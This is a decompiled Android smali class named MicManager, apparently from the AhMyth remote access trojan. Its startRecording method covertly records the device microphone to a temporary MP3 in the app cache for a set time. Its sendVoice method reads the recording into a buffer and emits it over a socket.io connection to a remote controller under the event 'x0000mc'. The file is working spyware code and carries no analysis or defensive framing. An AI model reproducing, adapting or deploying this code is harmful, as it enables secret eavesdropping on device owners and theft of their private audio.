.class public Lahmyth/mine/king/ahmyth/MicManager;
.super Ljava/lang/Object;
.source "MicManager.java"


# static fields
.field static final TAG:Ljava/lang/String; = "MediaRecording"

.field static audiofile:Ljava/io/File;

.field static recorder:Landroid/media/MediaRecorder;

.field static stopRecording:Ljava/util/TimerTask;


# direct methods
.method static constructor <clinit>()V
    .locals 0

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 31
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method static synthetic access$000(Ljava/io/File;)V
    .locals 0

    .line 31
    invoke-static {p0}, Lahmyth/mine/king/ahmyth/MicManager;->sendVoice(Ljava/io/File;)V

    return-void
.end method

.method private static sendVoice(Ljava/io/File;)V
    .locals 6

    .line 80
    invoke-virtual {p0}, Ljava/io/File;->length()J

    move-result-wide v0

    long-to-int v1, v0

    .line 81
    new-array v0, v1, [B

    .line 83
    :try_start_0
    new-instance v2, Ljava/io/BufferedInputStream;

    new-instance v3, Ljava/io/FileInputStream;

    invoke-direct {v3, p0}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    invoke-direct {v2, v3}, Ljava/io/BufferedInputStream;-><init>(Ljava/io/InputStream;)V

    const/4 v3, 0x0

    .line 84
    invoke-virtual {v2, v0, v3, v1}, Ljava/io/BufferedInputStream;->read([BII)I

    .line 85
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    const-string v4, "file"

    const/4 v5, 0x1

    .line 86
    invoke-virtual {v1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    const-string v4, "name"

    .line 87
    invoke-virtual {p0}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object p0

    invoke-virtual {v1, v4, p0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string p0, "buffer"

    .line 88
    invoke-virtual {v1, p0, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 89
    invoke-static {}, Lahmyth/mine/king/ahmyth/IOSocket;->getInstance()Lahmyth/mine/king/ahmyth/IOSocket;

    move-result-object p0

    invoke-virtual {p0}, Lahmyth/mine/king/ahmyth/IOSocket;->getIoSocket()Lio/socket/client/Socket;

    move-result-object p0

    const-string v0, "x0000mc"

    new-array v4, v5, [Ljava/lang/Object;

    aput-object v1, v4, v3

    invoke-virtual {p0, v0, v4}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    .line 90
    invoke-virtual {v2}, Ljava/io/BufferedInputStream;->close()V
    :try_end_0
    .catch Ljava/io/FileNotFoundException; {:try_start_0 .. :try_end_0} :catch_2
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p0

    .line 96
    invoke-virtual {p0}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_0

    :catch_1
    move-exception p0

    .line 94
    invoke-virtual {p0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_0

    :catch_2
    move-exception p0

    .line 92
    invoke-virtual {p0}, Ljava/io/FileNotFoundException;->printStackTrace()V

    :goto_0
    return-void
.end method

.method public static startRecording(I)V
    .locals 4
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .line 44
    invoke-static {}, Lahmyth/mine/king/ahmyth/MainService;->getContextOfApplication()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v0

    :try_start_0
    const-string v1, "DIRR"

    .line 46
    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    const-string v1, "sound"

    const-string v2, ".mp3"

    .line 47
    invoke-static {v1, v2, v0}, Ljava/io/File;->createTempFile(Ljava/lang/String;Ljava/lang/String;Ljava/io/File;)Ljava/io/File;

    move-result-object v0

    sput-object v0, Lahmyth/mine/king/ahmyth/MicManager;->audiofile:Ljava/io/File;
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 55
    new-instance v0, Landroid/media/MediaRecorder;

    invoke-direct {v0}, Landroid/media/MediaRecorder;-><init>()V

    sput-object v0, Lahmyth/mine/king/ahmyth/MicManager;->recorder:Landroid/media/MediaRecorder;

    const/4 v1, 0x1

    .line 56
    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setAudioSource(I)V

    .line 57
    sget-object v0, Lahmyth/mine/king/ahmyth/MicManager;->recorder:Landroid/media/MediaRecorder;

    const/4 v1, 0x2

    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setOutputFormat(I)V

    .line 58
    sget-object v0, Lahmyth/mine/king/ahmyth/MicManager;->recorder:Landroid/media/MediaRecorder;

    const/4 v1, 0x3

    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setAudioEncoder(I)V

    .line 59
    sget-object v0, Lahmyth/mine/king/ahmyth/MicManager;->recorder:Landroid/media/MediaRecorder;

    sget-object v1, Lahmyth/mine/king/ahmyth/MicManager;->audiofile:Ljava/io/File;

    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setOutputFile(Ljava/lang/String;)V

    .line 60
    sget-object v0, Lahmyth/mine/king/ahmyth/MicManager;->recorder:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->prepare()V

    .line 61
    sget-object v0, Lahmyth/mine/king/ahmyth/MicManager;->recorder:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->start()V

    .line 64
    new-instance v0, Lahmyth/mine/king/ahmyth/MicManager$1;

    invoke-direct {v0}, Lahmyth/mine/king/ahmyth/MicManager$1;-><init>()V

    sput-object v0, Lahmyth/mine/king/ahmyth/MicManager;->stopRecording:Ljava/util/TimerTask;

    .line 75
    new-instance v0, Ljava/util/Timer;

    invoke-direct {v0}, Ljava/util/Timer;-><init>()V

    sget-object v1, Lahmyth/mine/king/ahmyth/MicManager;->stopRecording:Ljava/util/TimerTask;

    mul-int/lit16 p0, p0, 0x3e8

    int-to-long v2, p0

    invoke-virtual {v0, v1, v2, v3}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;J)V

    return-void

    :catch_0
    const-string p0, "MediaRecording"

    const-string v0, "external storage access error"

    .line 49
    invoke-static {p0, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method
